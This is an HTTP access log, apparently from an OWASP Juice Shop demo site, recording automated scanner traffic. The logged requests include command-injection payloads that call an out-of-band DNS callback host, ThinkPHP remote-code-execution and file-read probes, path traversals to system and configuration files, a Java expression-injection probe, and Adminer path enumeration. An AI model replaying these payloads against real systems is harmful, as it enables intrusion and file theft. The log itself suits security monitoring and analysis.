44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%7Cecho%20bmtsZ3loNW9uNTN0dWNkZXlreWxvNjNwbnY3MmVqaWsyc3VpbnpubHc1M2o1cHhzNGN6YS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%3Becho%20c2xvdDZreHFjMzI2eG82dmJyajN5cG9mb21mcHUybWIzN2Q3ZXhrdnpqcXc2a3JlMnNpcS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:58 +0000] "GET /dashboard.html HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%26%26echo%20b2N0anpsdnRtZHpna2Rma3Uzb2g3bGh0c2thaDJvd3p5bTdhNWs1M2JtdW5kZmZsN2dmcS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 302 254 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%60echo%20bGg3dWN2emJ3enZ4ZnRmNHphbHR0dmVtYTZ2dXBkbGwzbzJ2Mm83ZzZ6cG4ybXBuejJpYS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts%60 HTTP/1.1" 302 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%26%26echo%20b2N0anpsdnRtZHpna2Rma3Uzb2g3bGh0c2thaDJvd3p5bTdhNWs1M2JtdW5kZmZsN2dmcS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:58 +0000] "GET /status HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%3Bnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20j4viwefh6rwgk5a4if7l2rr7dgjzrec262d6t5a2ej6cntb2k7yq HTTP/1.1" 302 185 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shopnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20pg2luyqngth5wpr623m44zw26v5msncumvspfjf2pjydlu6ja6oa HTTP/1.1" 302 184 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%7Cnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20eccux6pa5ej4tedrm6msvumwabpbt3tdhsmlda6xbevl5rwmhdjq HTTP/1.1" 302 185 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=nslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20pg2luyqngth5wpr623m44zw26v5msncumvspfjf2pjydlu6ja6oa HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=%3Bnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20j4viwefh6rwgk5a4if7l2rr7dgjzrec262d6t5a2ej6cntb2k7yq HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=%7C%7Cnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20wqk23plhfa2mzkgjslzn2ao7637whl7azpxvgfbh4usdyu74nacq HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=%7Cnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20eccux6pa5ej4tedrm6msvumwabpbt3tdhsmlda6xbevl5rwmhdjq HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:59 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%7C%7Cnslookup%20-domain%3D%22was.m.cloud.aws.tenablesecurity.com%22%20wqk23plhfa2mzkgjslzn2ao7637whl7azpxvgfbh4usdyu74nacq HTTP/1.1" 302 186 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:59 +0000] "GET /upstream_conf?upstream=backend HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /app/node_modules/express/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /api/Challenges/?sort=name HTTP/1.1" 200 87194 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /assets/public/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:59 +0000] "GET /app/node_modules/express/lib/router/index.js:376:14 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
111.223.186.144 - - [04/Aug/2025:04:31:59 +0000] "GET /orders/socket.io/?EIO=4&transport=polling&t=PXpMS5- HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/orders" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - admin [04/Aug/2025:04:31:59 +0000] "GET /system/console/gatewaystatus HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:32:00 +0000] "GET /index.php?s=admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_get_contents&vars%5B1%5D%5B%5D=index.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:00 +0000] "GET /opcache.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:00 +0000] "GET /opcache-status/opcache.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:32:00 +0000] "POST /index.php?s=captcha HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:00 +0000] "GET /index.php?s=index/%5Cthink%5CRequest/input&filter=file_get_contents&data=index.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:00 +0000] "GET /php-opcache-status/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:32:00 +0000] "GET /index.php?s=admin/%5Cthink%5CRequest/input&filter=file_get_contents&data=index.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:00 +0000] "GET /app/node_modules/express/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:00 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:00 +0000] "GET /opcache-status/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:00 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:00 +0000] "GET /rest/captcha/ HTTP/1.1" 200 48 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:01 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:01 +0000] "GET /app/node_modules/main.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:02 +0000] "GET /dana-na///css/ds.js?/dana/html5acc/guacamole/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
2001:ee0:8209:632:69fa:39ee:74cd:7e3a - - [04/Aug/2025:04:32:02 +0000] "GET /FUZZ/socket.io/?EIO=4&transport=polling&t=PXpMSgX HTTP/1.1" 200 - "https://demo.owasp-juice.shop/FUZZ" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:02 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337 HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shells HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /_adminer.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /ad.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /ad.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.3.0-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.3.0-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.3.0-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.3.1.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.4.0-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.4.0-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.5.0.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.5.0-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.6.1.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /Adminer.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.2.5-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.6.1-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.2.5.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.6.1-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.2.5-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.2.5-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.6.1-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:03 +0000] "GET /adminer-4.3.0.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.3.1-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.3.1-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.4.0.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.3.1-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.4.0-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.5.0-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.0.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.5.0-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.0-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.0-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.0-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.2-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.2.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.2-mysql.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /adminer-4.6.2-mysql-en.php HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /roller-ui/login.rol?pageTitle=${new%20java.lang.Integer(99774%2b99536)} HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:04 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:04 +0000] "GET /index HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /app/node_modules/express/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "POST /rest/user/login HTTP/1.1" 200 832 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /api/Challenges/?name=Score%20Board HTTP/1.1" 200 695 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:05 +0000] "GET /default HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /app/node_modules/express/lib/router/index.js:421:3 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
